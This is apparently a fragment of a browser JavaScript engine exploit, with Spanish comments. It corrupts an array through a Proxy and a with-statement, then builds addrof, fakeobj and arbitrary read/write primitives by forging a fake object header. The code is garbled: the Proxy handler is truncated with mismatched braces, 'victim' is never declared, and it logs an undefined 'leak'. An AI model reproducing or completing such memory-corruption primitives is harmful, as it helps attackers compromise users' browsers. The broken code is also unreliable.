    function phex(val) {
        return "0x" + val.toString(16).padStart(16, "0");
    }

    function exploit() {

        let proxy = new Proxy({}, {

                    victim.length = 1;
                }

        with (proxy) {
            victim[1];
        }

        // Ahora el victim está corrupto
        log("[+] Victim corrupto");

        // Crear primitivas reales
        let ab = new ArrayBuffer(0x100);
        let f64 = new Float64Array(ab);
        let u32 = new Uint32Array(ab);

        function ftoi(val) {
            f64[0] = val;
            return u32[0] + u32[1] * 0x100000000;
        }

        function itof(val) {
            u32[0] = val % 0x100000000;
            u32[1] = (val - (val % 0x100000000)) / 0x100000000;
            return f64[0];
        }

        let container = {
            cell_header: itof(0x0000000000000000),
            butterfly: victim
        };

        let container_addr = ftoi(addrof(container));
        log("[+] container @ " + phex(container_addr));

        let fake_obj_addr = container_addr + 0x20;
        let fake_obj = fakeobj(itof(fake_obj_addr));

        log("[+] Fake object creado!");

        // ========== PRIMITIVAS FINALES ==========

        function addrof(obj) {
            victim[0] = obj;
            return ftoi(victim[1]);
        }

        function fakeobj(addr) {
            victim[1] = itof(addr);
            return victim[0];
        }

        function read64(addr) {
            fake_obj[1] = itof(addr);
            return ftoi(fake_obj[0]);
        }

        function write64(addr, val) {
            fake_obj[1] = itof(addr);
            fake_obj[0] = itof(val);
        }

        // ========== TEST DE PRIMITIVAS ==========

        let test_obj = {a: 13.37};
        let addr = addrof(test_obj);
        log("[+] Dirección de test_obj: " + phex(addr));

        log("[+] Leak de memoria: " + phex(leak));
